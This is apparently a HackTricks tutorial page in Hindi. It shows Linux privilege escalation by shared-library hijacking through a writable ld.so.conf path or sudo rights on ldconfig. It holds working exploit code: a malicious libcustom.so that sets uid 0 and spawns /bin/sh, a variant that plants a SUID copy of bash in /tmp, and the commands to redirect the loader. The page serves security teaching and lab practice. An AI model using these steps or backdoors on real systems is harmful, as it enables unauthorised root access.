# ld.so privesc exploit का उदाहरण

{{#include ../../banners/hacktricks-training.md}}

## Environment तैयार करें

निम्नलिखित section में आपको उन files का code मिलेगा जिनका उपयोग हम Environment तैयार करने के लिए करने वाले हैं।

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. अपनी machine में उसी folder में वे files **बनाएं**
2. **library** को **compile** करें: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. `libcustom.so` को `/usr/lib` में **copy** करें और cache को refresh करें: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
4. **executable** को **compile** करें: `gcc sharedvuln.c -o sharedvuln -lcustom`

### environment की जांच करें

जांचें कि _libcustom.so_ को _/usr/lib_ से **load** किया जा रहा है और आप binary को **execute** कर सकते हैं।
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### उपयोगी triage commands

किसी वास्तविक target पर attack करते समय, binary को जिस **exact library name** की आवश्यकता है और loader वर्तमान में जिसे **resolve** कर रहा है, उसे verify करें:
```bash
readelf -d ./sharedvuln | grep NEEDED
ldconfig -p | grep libcustom
/lib64/ld-linux-x86-64.so.2 --list ./sharedvuln 2>/dev/null \
# x86_64; adjust for your arch
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'
```
कुछ उपयोगी सावधानियाँ:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` आमतौर पर **काम नहीं करता**, क्योंकि
redirection आपके current shell द्वारा किया जाता है। इसके बजाय
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` का उपयोग करें।
- **SUID/privileged** binaries **secure-execution mode** में
`LD_LIBRARY_PATH`/`LD_PRELOAD` को अनदेखा करते हैं, लेकिन `/etc/ld.so.conf` से आने वाली
directories अभी भी trusted loader configuration का हिस्सा होती हैं, इसलिए यह misconfiguration
privileged programs को प्रभावित कर सकती है।
- नए glibc versions में dynamic loader `--list-diagnostics` भी उपलब्ध कराता है, जो
cache resolution और `glibc-hwcaps` subdirectory selection को debug करने के लिए उपयोगी है, जब hijack अपेक्षा के अनुसार काम नहीं करता।

## Exploit

इस scenario में हम मानेंगे कि **किसी ने `/etc/ld.so.conf/`** की किसी file के अंदर
एक vulnerable entry बनाई है:
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Vulnerable folder _/home/ubuntu/lib_ है (जहाँ हमारे पास writable access है)।\
उस path के अंदर निम्नलिखित code को **Download and compile** करें:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setuid(0);
setgid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
यदि आपको उम्मीद है कि **root** (या कोई अन्य privileged account) बाद में vulnerable binary को execute करेगा, तो interactive shell spawn करने के बजाय **root-owned artifact** छोड़ना आमतौर पर बेहतर होता है। उदाहरण के लिए:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
फिर, privileged execution होने के बाद, आप `/tmp/rootbash -p` का उपयोग कर सकते हैं।

अब जबकि हमने **misconfigured** path के अंदर malicious libcustom library **create कर दी है**, हमें **reboot** होने या root user द्वारा **`ldconfig`** execute करने का इंतज़ार करना होगा (_यदि आप इस binary को **sudo** के रूप में execute कर सकते हैं या इसमें **suid bit** है, तो आप इसे स्वयं execute कर पाएँगे_)।

ऐसा होने के बाद, **पुनः जाँचें** कि `sharedvuln` executable `libcustom.so` library को कहाँ से load कर रहा है:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
जैसा कि आप देख सकते हैं, यह इसे **`/home/ubuntu/lib` से लोड कर रहा है** और यदि कोई user इसे execute करता है, तो एक shell execute होगा:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> ध्यान दें कि इस उदाहरण में हमने privileges escalate नहीं किए हैं, लेकिन executed commands को modify करके और **root या किसी अन्य privileged user के vulnerable binary execute करने का इंतज़ार करके** हम privileges escalate कर पाएँगे।

### अन्य misconfigurations - वही vuln

पिछले उदाहरण में हमने एक ऐसी misconfiguration बनाई थी जिसमें administrator ने **`/etc/ld.so.conf.d/` के अंदर किसी configuration file में एक non-privileged folder सेट किया था**।\
लेकिन ऐसी अन्य misconfigurations भी हैं जो यही vulnerability उत्पन्न कर सकती हैं। यदि आपके पास `/etc/ld.so.conf.d`s के अंदर किसी **config file**, `/etc/ld.so.conf.d` folder या `/etc/ld.so.conf` file में **write permissions** हैं, तो आप इसी vulnerability को configure करके exploit कर सकते हैं।

## Exploit 2

**मान लें कि आपके पास `ldconfig` पर sudo privileges हैं**।\
आप `ldconfig` को यह **निर्दिष्ट कर सकते हैं कि conf files कहाँ से load करनी हैं**, इसलिए इसका लाभ उठाकर हम `ldconfig` से arbitrary folders load करवा सकते हैं।\
तो, `"/tmp"` को load करने के लिए आवश्यक files और folders बनाते हैं:
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
अब, जैसा कि **previous exploit** में बताया गया है, **malicious library को `/tmp` के अंदर create करें**।\
और अंत में, path को load करके जाँचें कि binary library को कहाँ से load कर रही है:
```bash
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**जैसा कि आप देख सकते हैं, `ldconfig` पर sudo privileges होने पर आप उसी vulnerability का exploit कर सकते हैं।**



## संदर्भ

- [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [ldconfig(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
{{#include ../../banners/hacktricks-training.md}}
